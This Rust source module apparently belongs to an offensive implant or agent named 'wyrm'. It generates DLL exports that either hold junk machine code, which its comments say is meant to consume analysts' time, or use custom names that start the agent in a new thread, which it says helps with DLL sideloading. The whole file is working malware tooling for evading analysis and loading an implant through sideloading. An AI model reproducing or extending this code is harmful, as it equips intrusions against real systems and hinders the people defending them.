//! A module for creating either fake exports full of junk, or exports which
//! lead to the running of the agent, customisable via profiles - thanks to the
//! magic of macros.
//!
//! This module would be used for two main reasons:
//!
//! 1) Obfuscation: If you wish to obfuscate the binary by enforcing a number of random
//! exports which take analyst time up to review, then you may wish to add a number of
//! junk export functions.
//!
//! 2) Custom entrypoint: If you wish a custom entrypoint which is not `run`, this will
//! allow you to define that - and it will come in handy for custom DLL sideloading.
//

use core::arch::naked_asm;
use std::{mem::transmute, ptr::null_mut};

use windows_sys::Win32::System::Threading::{CreateThread, LPTHREAD_START_ROUTINE, Sleep};

use crate::entry::{APPLICATION_RUNNING, start_wyrm};

pub fn internal_dll_start(start_type: StartType) {
    match start_type {
        StartType::DllMain => start_wyrm_in_os_thread(),
        StartType::FromExport => loop {
            if !APPLICATION_RUNNING.load(core::sync::atomic::Ordering::SeqCst) {
                break;
            }
            unsafe { Sleep(1000) };
        },
    }
}

fn start_wyrm_in_os_thread() {
    unsafe {
        let start = transmute::<fn(), LPTHREAD_START_ROUTINE>(start_wyrm);
        let _ = CreateThread(null_mut(), 0, start, null_mut(), 0, null_mut());
    }
}

#[allow(dead_code)]
pub enum StartType {
    DllMain,
    FromExport,
}

macro_rules! build_dll_export_by_name_start_wyrm {
    ($name:ident) => {
        #[unsafe(no_mangle)]
        pub extern "system" fn $name() {
            internal_dll_start(StartType::FromExport);
        }
    };
}

macro_rules! build_dll_export_by_name_junk_machine_code {
    ($name:ident, $($b:expr),+ $(,)?) => {
        #[unsafe(no_mangle)]
        #[unsafe(naked)]
        pub unsafe extern "system" fn $name() {
            naked_asm!(
                $(
                    concat!(".byte ", stringify!($b)),
                )+
            )
        }
    };
}

include!(concat!(env!("OUT_DIR"), "/custom_exports.rs"));
